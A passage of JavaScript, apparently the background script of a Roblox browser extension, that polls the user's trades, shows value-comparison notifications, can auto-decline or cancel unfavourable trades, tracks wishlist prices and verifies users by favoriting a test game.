								break
							}
						}
						if (newTrade) {
							setLocalStorage("cachedTrades", cachedTrades)
						}
					}
				}
			} **/
			resolve(0)
		}
		doGet(resolve)
	})
}

function loadTradesType(tradeType) {
	return new Promise(resolve => {
        function doLoad(tradeCursor, tempArray) {
            $.get('https://trades.roblox.com/v1/trades/' + tradeType + '?sortOrder=Asc&limit=100&cursor=' + tradeCursor, function(data){
                console.log(data)
                for (i = 0; i < data.data.length; i++) {
                    tempArray.push([data.data[i].id, data.data[i].user.id])
                }
                if (data.nextPageCursor != null) {
                    doLoad(data.nextPageCursor, tempArray)
                } else { //Reached the last page
                    resolve(tempArray)
                }
            }).fail(function() {
                setTimeout(function() {
                    doLoad(tradeCursor, tempArray)
                }, 31000)
            })
        }
        doLoad("", [])
	})
}

function loadTradesData(tradeType) {
	return new Promise(resolve => {
        function doLoad(tradeCursor, tempArray) {
            $.get('https://trades.roblox.com/v1/trades/' + tradeType + '?sortOrder=Asc&limit=100&cursor=' + tradeCursor, function(data){
                console.log(data)
                for (i = 0; i < data.data.length; i++) {
                    tempArray.push(data.data[i])
                }
                if (data.nextPageCursor != null) {
                    doLoad(data.nextPageCursor, tempArray)
                } else { //Reached the last page
                    resolve(tempArray)
                }
            }).fail(function() {
                setTimeout(function() {
                    doLoad(tradeCursor, tempArray)
                }, 31000)
            })
        }
        doLoad("", [])
	})
}


var notifications = {}

setLocalStorage("cachedTrades", {})

async function notifyTrades(trades) {
	for (i = 0; i < trades.length; i++) {
		trade = trades[i]
		tradeId = Object.keys(trade)[0]
		tradeType = trade[tradeId]
		if (!(tradeId + "_" + tradeType in tradesNotified)) {
			tradesNotified[tradeId + "_" + tradeType] = true
			context = ""
			buttons = []
			switch (tradeType) {
				case "inboundTrades":
					context = "Trade Inbound"
					buttons = [{title: "Open"}, {title: "Decline"}]
					break;
				case "outboundTrades":
					context = "Trade Outbound"
					buttons = [{title: "Open"}, {title: "Cancel"}]
					break;
				case "completedTrades":
					context = "Trade Completed"
					buttons = [{title: "Open"}]
					break;
				case "inactiveTrades":
					context = "Trade Declined"
					buttons = [{title: "Open"}]
					break;
			}
			trade = await fetchTrade(tradeId)
			values = await fetchValues({data: [trade]})
			values = values[0]
			compare = values[values['them']] - values[values['us']]
			lossRatio = (1 - values[values['them']] / values[values['us']]) * 100
			console.log("Trade Loss Ratio: " + lossRatio)
			if (context == "Trade Inbound" && await loadSettings("autoDecline") && lossRatio >= await loadSettings("declineThreshold")) {
				console.log("Declining Trade, Trade Loss Ratio: " + lossRatio)
				cancelTrade(tradeId, await getStorage("token"))
			}
			if (context == "Trade Outbound" && await loadSettings("tradeProtection") && lossRatio >= await loadSettings("cancelThreshold")) {
				console.log("Cancelling Trade, Trade Loss Ratio: " + lossRatio)
				cancelTrade(tradeId, await getStorage("token"))
			}
			if (await loadSettings("tradeNotifier")) {
				compareText = "Win: +"
				if (compare > 0) {
					compareText = "Win: +"
				} else if (compare == 0) {
					compareText = "Equal: +"
				} else if (compare < 0) {
					compareText = "Loss: "
				}
				var thumbnail = await fetchPlayerThumbnails([trade.user.id])
				options = {type: "basic", title: context, iconUrl: thumbnail.data[0].imageUrl, buttons: buttons, priority: 2, message:`Partner: ${values['them']}\nYour Value: ${addCommas(values[values['us']])}\nTheir Value: ${addCommas(values[values['them']])}`, contextMessage: compareText + addCommas(compare) + " Value", eventTime: Date.now()}
				notificationId = Math.floor(Math.random() * 10000000).toString()
				notifications[notificationId] = {type: "trade", tradeType: tradeType, tradeid: tradeId, buttons: buttons}
				if (context != "Trade Declined" || await loadSettings("hideDeclinedNotifications") == false) {
					await createNotification(notificationId, options)
				}
			}
		}
	}
}
var tradeNotifierInitialized = false
setTimeout(function() {
	setInterval(async function() {
		if (await loadSettings("tradeNotifier") || await loadSettings("autoDecline") || await loadSettings("tradeProtection")) {
			getTrades(!tradeNotifierInitialized)
			tradeNotifierInitialized = true
		} else {
			tradeNotifierInitialized = false
		}
	}, 20000)
}, 10000)

async function initialTradesCheck() {
	if (await loadSettings("tradeNotifier") || await loadSettings("autoDecline") || await loadSettings("tradeProtection")) {
		getTrades(true)
		tradeNotifierInitialized = true
	}
}

async function initializeCache() {
	if (await loadSettings("tradePreviews")) {
		cachedTrades = await getLocalStorage("cachedTrades")
		if (typeof cachedTrades == 'undefined') {
			console.log("Initializing Cache...")
			setLocalStorage("cachedTrades", {"initialized": new Date().getTime()})
		} else if (cachedTrades['initialized'] + 24 * 60 * 60 * 1000 < new Date().getTime() || typeof cachedTrades['initialized'] == 'undefined') {
			console.log("Initializing Cache...")
			setLocalStorage("cachedTrades", {"initialized": new Date().getTime()})
		}
	}
}

initializeCache()

async function cacheTrades() {
	if (await loadSettings("tradePreviews")) {
		cachedTrades = await getLocalStorage("cachedTrades")
		tradesLoaded = 0
		index = 0
		tradeTypes = ["inbound", "outbound", "completed", "inactive"]
		async function loadTradeType(tradeType) {
			myTrades = await fetchTradesCursor(tradeType, 100, "")
			for (i = 0; i < myTrades.data.length; i++) {
				trade = myTrades.data[i]
				if (tradesLoaded <= 20) {
					if (!(trade.id in cachedTrades)) {
						cachedTrades[trade.id] = await fetchTrade(trade.id)
						tradesLoaded++
					}
				} else {
					break
				}
			}
			setLocalStorage("cachedTrades", cachedTrades)
			if (tradesLoaded <= 20 && index < 3) {
				index++
				loadTradeType(tradeTypes[index])
			}
		}
		loadTradeType(tradeTypes[index])
	}
}

setTimeout(function(){
	initialTradesCheck()
}, 5000)

async function toggle(feature) {
	features = await getStorage("rpFeatures")
	featureBool = features[feature]
	if (featureBool) {
		features[feature] = false
	} else {
		features[feature] = true
	}
	await setStorage("rpFeatures", features)
}

setInterval(async function(){
	loadToken()
}, 120000)
loadToken()

setInterval(async function(){
	subscriptionManager.validateLicense()
}, 300000)
subscriptionManager.validateLicense()

function generalNotification(notification) {
	console.log(notification)
	var notificationOptions = {
		type: "basic",
		title: notification.subject,
		message: notification.message,
		priority: 2,
		iconUrl: notification.icon
	}
	chrome.notifications.create("", notificationOptions)
}

async function notificationButtonClicked(notificationId, buttonIndex) { //Notification button clicked
	notification = notifications[notificationId]
	if (notification['type'] == 'trade') {
		if (notification['tradeType'] == 'inboundTrades') {
			if (buttonIndex == 0) {
				chrome.tabs.create({ url: "https://www.roblox.com/trades" })
			} else if (buttonIndex == 1) {
				cancelTrade(notification['tradeid'], await getStorage('token'))
			}
		} else if (notification['tradeType'] == 'outboundTrades') {
			if (buttonIndex == 0) {
				chrome.tabs.create({ url: "https://www.roblox.com/trades#outbound" })
			} else if (buttonIndex == 1) {
				cancelTrade(notification['tradeid'], await getStorage('token'))
			}
		} else if (notification['tradeType'] == 'completedTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#completed" })
		} else if (notification['tradeType'] == 'inactiveTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#inactive" })
		}
	}
}

function notificationClicked(notificationId) {
	console.log(notificationId)
	notification = notifications[notificationId]
	console.log(notification)
	if (notification['type'] == 'trade') {
		if (notification['tradeType'] == 'inboundTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades" })
		}
		else if (notification['tradeType'] == 'outboundTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#outbound" })
		}
		else if (notification['tradeType'] == 'completedTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#completed" })
		}
		else if (notification['tradeType'] == 'inactiveTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#inactive" })
		}
	} else if (notification['type'] == 'wishlist') {
		chrome.tabs.create({ url: "https://www.roblox.com/catalog/" + parseInt(notification['itemId']) + "/" })
	}
}

chrome.notifications.onClicked.addListener(notificationClicked)

chrome.notifications.onButtonClicked.addListener(notificationButtonClicked)

setInterval(function(){
	$.get("https://api.ropro.io/disabledFeatures.php", function(data) {
		disabledFeatures = data
	})
}, 300000)

async function initializeMisc() {
	avatarBackground = await getStorage('avatarBackground')
	if (typeof avatarBackground === "undefined") {
		await setStorage("avatarBackground", "default")
	}
	globalTheme = await getStorage('globalTheme')
	if (typeof globalTheme === "undefined") {
		await setStorage("globalTheme", "")
	}
	try {
		var myId = await getStorage('rpUserID')
		if (typeof myId != "undefined" && await loadSettings('globalThemes')) {
			loadGlobalTheme()
		}
	} catch(e) {
		console.log(e)
	}
}
initializeMisc()

async function loadGlobalTheme() {
	var myId = await getStorage('rpUserID')
	$.post('https://api.ropro.io/getProfileTheme.php?userid=' + parseInt(myId), async function(data){
		if (data.theme != null) {
			await setStorage("globalTheme", data.theme)
		}
	})
}

function updateToken() {
	return new Promise(resolve => {
		$.post('https://catalog.roblox.com/v1/catalog/items/details').fail(function(r,e,s){
			token = r.getResponseHeader('x-csrf-token')
			myToken = token
			chrome.storage.sync.set({'token': token})
			resolve(token)
		})
	})
}

function doFavorite(universeId, unfavorite) {
	return new Promise(resolve => {
		async function doFavoriteRequest(resolve) {
			await updateToken()
			$.ajax({
				url: "https://games.roblox.com/v1/games/" + universeId + "/favorites",
				type: "POST",
				headers: {"X-CSRF-TOKEN": myToken},
				contentType: 'application/json',
				data: JSON.stringify({"isFavorited": !unfavorite}),
				success: function(data) {
					resolve(data)
				},
				error: function (textStatus, errorThrown) {
					resolve(errorThrown)
				}
			})
		}
		doFavoriteRequest(resolve)
	})
}

async function checkWishlist() {
	verificationDict = await getStorage('userVerification')
	userID = await getStorage('rpUserID')
	roproVerificationToken = "none"
	if (typeof verificationDict != 'undefined') {
		if (verificationDict.hasOwnProperty(userID)) {
			roproVerificationToken = verificationDict[userID]
		}
	}
	$.post({'url': 'https://api.ropro.io/wishlistCheck.php', 'headers': {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, async function(data) {
		if (Object.keys(data).length > 0) {
			await updateToken()
			var payload = {"items": []}
			var prices = {}
			for (const [id, item] of Object.entries(data)) {
				if (parseInt(Math.abs((parseInt(item['currPrice']) - parseInt(item['prevPrice'])) / parseInt(item['prevPrice']) * 100)) >= 10) {
					if (item['type'] == 'asset') {
						payload['items'].push({"itemType": "Asset","id": parseInt(id)})
					}
					prices[parseInt(id)] = [parseInt(item['prevPrice']), parseInt(item['currPrice'])]
				}
			}
			$.post({'url': 'https://catalog.roblox.com/v1/catalog/items/details', 'headers': {'X-CSRF-TOKEN': myToken, 'Content-Type': 'application/json'}, data: JSON.stringify(payload)}, async function(data) {
				console.log(data)
				for (var i = 0; i < data.data.length; i++) {
					var item = data.data[i]
					$.get('https://api.ropro.io/getAssetThumbnailUrl.php?id=' + item.id, function(imageUrl) {
						var options = {type: "basic", title: item.name, iconUrl: imageUrl, priority: 2, message:'Old Price: ' + prices[item.id][0] + ' Robux\nNew Price: ' + prices[item.id][1] + ' Robux', contextMessage: 'Price Fell By ' + parseInt(Math.abs((prices[item.id][1] - prices[item.id][0]) / prices[item.id][0] * 100)) + '%', eventTime: Date.now()}
						var notificationId = Math.floor(Math.random() * 1000000).toString()
						notifications[notificationId] = {type: "wishlist", itemId: item.id}
						createNotification(notificationId, options)
					})
				}
			})
		}
	})
}

function getVerificationToken() {
	return new Promise(resolve => {
		async function generateVerificationToken(resolve) {
			try {
				$.ajax({
					type: "POST",
					url: "https://api.ropro.io/generateVerificationToken.php",
					success: function(data){
						if (data.success == true) {
							resolve(data.token)
						} else {
							resolve(null)
						}
					},
					error: function(XMLHttpRequest, textStatus, errorThrown) {
					   resolve(null)
					}
				  });
			} catch (e) {
				console.log(e)
				resolve(null)
			}
		}
		generateVerificationToken(resolve)
	})
}

function verifyUser() {  //Because Roblox offers no public OAuth API which RoPro can use to authenticate the user ID of RoPro users, when the user clicks the verify button on the Roblox homepage RoPro will automatically favorite then unfavorite a test game in order to verify the user's Roblox username & ID.
	return new Promise(resolve => {
		async function doVerify(resolve) {
			try {
				$.post('https://api.ropro.io/verificationMetadata.php', async function(data) {
					verificationPlace = data['universeId']
					favorite = await doFavorite(verificationPlace, false)
					console.log(favorite)
					verificationToken = await getVerificationToken()
					console.log(verificationToken)
					unfavorite = await doFavorite(verificationPlace, true)
					console.log(unfavorite)
					if (verificationToken != null && verificationToken.length == 25) {
						console.log("Successfully verified.")
						var verificationDict = await getStorage('userVerification')
						var myId = await getStorage('rpUserID')
						verificationDict[myId] = verificationToken
						await setStorage('userVerification', verificationDict)
						resolve("success")
					} else {
						resolve(null)
					}
				}).fail(function(r,e,s){
					resolve(null)
				})
			} catch(e) {
				resolve(null)
			}
		}
		doVerify(resolve)
	})
}

chrome.runtime.onMessage.addListener(function(request,sender,sendResponse)
{
	switch(request.greeting) {
		case "GetURL":
			if (request.url.startsWith('https://ropro.io') || request.url.startsWith('https://api.ropro.io')) {
				async function doPost() {
					verificationDict = await getStorage('userVerification')
					userID = await getStorage('rpUserID')
					roproVerificationToken = "none"
					if (typeof verificationDict != 'undefined') {
						if (verificationDict.hasOwnProperty(userID)) {
							roproVerificationToken = verificationDict[userID]
						}
					}
					$.post({'url':request.url, 'headers': {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, function(data) {
						sendResponse(data);
					}).fail(function() {
						sendResponse("ERROR")
					})
				}
				doPost()
			} else {
				$.get(request.url, function(data) {
					sendResponse(data);
				}).fail(function() {
					sendResponse("ERROR")
				})
			}
			break;
		case "GetURLCached":
			$.get({url: request.url, headers: {'Cache-Control': 'public, max-age=604800', 'Pragma': 'public, max-age=604800'}}, function(data) {
				sendResponse(data);
			}).fail(function() {
				sendResponse("ERROR")
			})
			break;
		case "PostURL":
			if (request.url.startsWith('https://ropro.io') || request.url.startsWith('https://api.ropro.io')) {
				async function doPostURL() {
					verificationDict = await getStorage('userVerification')
					userID = await getStorage('rpUserID')
					roproVerificationToken = "none"
					if (typeof verificationDict != 'undefined') {
						if (verificationDict.hasOwnProperty(userID)) {
							roproVerificationToken = verificationDict[userID]
						}
					}
					$.ajax({
						url: request.url,
						type: "POST",
						headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID},
						data: request.jsonData,
						success: function(data) {
							sendResponse(data);
						}
					})
				}
				doPostURL()
			} else {
				$.ajax({
					url: request.url,
					type: "POST",
					data: request.jsonData,
					success: function(data) {
						sendResponse(data);
					}
				})
			}
			break;
		case "PostValidatedURL":
			$.ajax({
				url: request.url,
				type: "POST",
				headers: {"X-CSRF-TOKEN": myToken},
				contentType: 'application/json',
				data: request.jsonData,
				success: function(data) {
					if (!("errors" in data)) {
						sendResponse(data);
					} else {
						sendResponse(null)
					}
				},
				error: function(response) {
					if (response.status != 403) {
						sendResponse(null)
					}
					token = response.getResponseHeader('x-csrf-token')
					myToken = token
					$.ajax({
						url: request.url,
						type: "POST",
						headers: {"X-CSRF-TOKEN": myToken},
						contentType: 'application/json',
						data: request.jsonData,
						success: function(data) {
							if (!("errors" in data)) {
								sendResponse(data);
							} else {
								sendResponse(null)
							}
						},
						error: function(response) {
							sendResponse(null)
						}
					})
				}
			})
			break;
		case "GetStatusCode": 
			$.get({url: request.url}).always(function(r, e, s){
				sendResponse(r.status)
			})
			break;
		case "ValidateLicense":
			subscriptionManager.validateLicense()
			tradeNotifierInitialized = false
			break;
		case "DeclineTrade": 
			$.post({url: 'https://trades.roblox.com/v1/trades/' + parseInt(request.tradeId) + '/decline', headers: {'X-CSRF-TOKEN': myToken}}, function(data,error,res) {
				sendResponse(res.status)
			}).fail(function(r, e, s){
				if (r.status == 403) {
					$.post({url: 'https://trades.roblox.com/v1/trades/' + parseInt(request.tradeId) + '/decline', headers: {'X-CSRF-TOKEN' : r.getResponseHeader('x-csrf-token')}}, function(data,error,res) {
						sendResponse(r.status)
					})
				} else {
					sendResponse(r.status)
				}
			})
			break;
		case "GetUserID":
			$.get('https://users.roblox.com/v1/users/authenticated', function(data,error,res) {
				sendResponse(data['id'])
			})
			break;
		case "GetCachedTrades":
			sendResponse(inboundsCache)
			break;
		case "DoCacheTrade":
			function loadInbound(id) {
				if (id in inboundsCache && inboundsCache[id] != null) {
					sendResponse([inboundsCache[id], 1])
				} else {
					$.get('https://trades.roblox.com/v1/trades/' + id, function(data) {
						console.log(data)
						inboundsCache[data.id] = data
						sendResponse([data, 0])
					}).fail(function(r, e, s) {
						sendResponse(r.status)
					})
				}
            }
            loadInbound(request.tradeId)
			break;
		case "GetUsername":
			async function getUsername(){
				username = await getStorage("rpUsername")
				sendResponse(username)
			}
			getUsername()
			break;
		case "GetUserInventory":
				async function getInventory(){
					inventory = await loadInventory(request.userID)
					sendResponse(inventory)
				}
				getInventory()
				break;
		case "GetUserLimitedInventory":
			async function getLimitedInventory(){
				inventory = await loadLimitedInventory(request.userID)
				sendResponse(inventory)
			}
			getLimitedInventory()
			break;
		case "ServerFilterReverseOrder":
				async function getServerFilterReverseOrder(){
					var serverList = await serverFilterReverseOrder(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterReverseOrder()
				break;
		case "ServerFilterNotFull":
				async function getServerFilterNotFull(){
					var serverList = await serverFilterNotFull(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterNotFull()
				break;
		case "ServerFilterRandomShuffle":
				async function getServerFilterRandomShuffle(){
					var serverList = await serverFilterRandomShuffle(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterRandomShuffle()
				break;
		case "ServerFilterRegion":
				async function getServerFilterRegion(){
					var serverList = await serverFilterRegion(request.gameID, request.serverLocation)
					sendResponse(serverList)
				}
				getServerFilterRegion()
				break;
		case "ServerFilterBestConnection":
				async function getServerFilterBestConnection(){
					var serverList = await serverFilterBestConnection(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterBestConnection()
				break;
		case "ServerFilterNewestServers":
			async function getServerFilterNewestServers(){
				var serverList = await serverFilterNewestServers(request.gameID)
				sendResponse(serverList)
			}
			getServerFilterNewestServers()
			break;
		case "ServerFilterOldestServers":
			async function getServerFilterOldestServers(){
				var serverList = await serverFilterOldestServers(request.gameID)
				sendResponse(serverList)
			}
			getServerFilterOldestServers()
			break;
		case "ServerFilterMaxPlayers":
			async function getServerFilterMaxPlayers(){
				servers = await maxPlayerCount(request.gameID, request.count)
				sendResponse(servers)
			}
			getServerFilterMaxPlayers()
			break;
		case "GetRandomServer":
			async function getRandomServer(){
				randomServerElement = await randomServer(request.gameID)
				sendResponse(randomServerElement)
			}
			getRandomServer()
			break;
		case "GetProfileValue":
			getProfileValue(request.userID).then(sendResponse)
			break;
		case "GetSetting":
			async function getSettings(){
				setting = await loadSettings(request.setting)
				sendResponse(setting)
			}
			getSettings()
			break;
		case "GetTrades":
			async function getTradesType(type){
				tradesType = await loadTradesType(type)
				sendResponse(tradesType)
			}
			getTradesType(request.type)
			break;
		case "GetTradesData":
			async function getTradesData(type){
				tradesData = await loadTradesData(type)
				sendResponse(tradesData)
			}
			getTradesData(request.type)
			break;
		case "GetSettingValidity":
			async function getSettingValidity(){
				valid = await loadSettingValidity(request.setting)
				sendResponse(valid)
			}
			getSettingValidity()
			break;
		case "GetSettingValidityInfo":
			async function getSettingValidityInfo(){
				valid = await loadSettingValidityInfo(request.setting)
				sendResponse(valid)
			}
			getSettingValidityInfo()
			break;
		case "CheckVerification":
			async function getUserVerification(){
				verificationDict = await getStorage('userVerification')
				if (typeof verificationDict == 'undefined') {
					sendResponse(false)
				} else {
					if (verificationDict.hasOwnProperty(await getStorage('rpUserID'))) {
						sendResponse(true)
					} else {
						sendResponse(false)
					}
				}
			}
			getUserVerification()
			break;
		case "HandleUserVerification":
			async function doUserVerification(){
				verification = await verifyUser()
				verificationDict = await getStorage('userVerification')
				if (typeof verificationDict == 'undefined') {
					sendResponse(false)
				} else {
					if (verificationDict.hasOwnProperty(await getStorage('rpUserID'))) {
						sendResponse(true)
					} else {
						sendResponse(false)
					}
				}
			}
			doUserVerification()
			break;
		case "SyncSettings":
			syncSettings()
			setTimeout(function(){
				sendResponse("sync")
			}, 500)
			break;
		case "OpenOptions":
			chrome.tabs.create({url: chrome.extension.getURL('/options.html')})
			break;
		case "GetSubscription":
			async function doGetSubscription() {
				subscription = await getStorage("rpSubscription")
				sendResponse(subscription)
			}
			doGetSubscription()
			break;
		case "DeclineBots":
			async function doDeclineBots() {
				tradesDeclined = await declineBots()
				sendResponse(tradesDeclined)
			}
			doDeclineBots()
			break;
		case "GetMutualFriends":
			async function doGetMutualFriends(){
				mutuals = await mutualFriends(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFriends()
			break;
		case "GetMutualFollowers":
			async function doGetMutualFollowers(){
				mutuals = await mutualFollowers(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFollowers()
			break;
		case "GetMutualFollowing":
			async function doGetMutualFollowing(){
				mutuals = await mutualFollowing(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFollowing()
			break;
		case "GetMutualFavorites":
			async function doGetMutualFavorites(){
				mutuals = await mutualFavorites(request.userID, request.assetType)
				sendResponse(mutuals)
			}
			doGetMutualFavorites()
			break;
		case "GetMutualBadges":
			async function doGetMutualBadges(){
				mutuals = await mutualFavorites(request.userID, request.assetType)
				sendResponse(mutuals)
			}
			doGetMutualBadges()
			break;
		case "GetMutualGroups":
			async function doGetMutualGroups(){
				mutuals = await mutualGroups(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualGroups()
			break;
		case "GetMutualLimiteds":
			async function doGetMutualLimiteds(){
				mutuals = await mutualLimiteds(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualLimiteds()
			break;
		case "GetMutualItems":
			async function doGetMutualItems(){
				mutuals = await mutualItems(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualItems()
			break;
		case "GetItemValues":
			fetchItemValues(request.assetIds).then(sendResponse)
			break;
		case "CreateInviteTab":
			chrome.tabs.create({url: 'https://roblox.com/games/' + parseInt(request.placeid), active: false}, function(tab) {
				chrome.tabs.onUpdated.addListener(function tempListener (tabId , info) {
					if (tabId == tab.id && info.status === 'complete') {
						chrome.tabs.sendMessage(
							tabId,
							{type: "invite", key: request.key}
						  )
						chrome.tabs.onUpdated.removeListener(tempListener);
						setTimeout(function() {
							sendResponse(tab)
						}, 2000)
					}
				});
			})
			break;
		case "UpdateGlobalTheme":
			async function doLoadGlobalTheme(){
				await loadGlobalTheme()
				sendResponse()
			}
			doLoadGlobalTheme()
			break;
		case "LaunchCloudPlay":
			launchCloudPlayTab(request.placeID, request.serverID, request.accessCode)
			break;
	}

	return true;
})
setInterval(sendNotifications, 2 * 60 * 1000);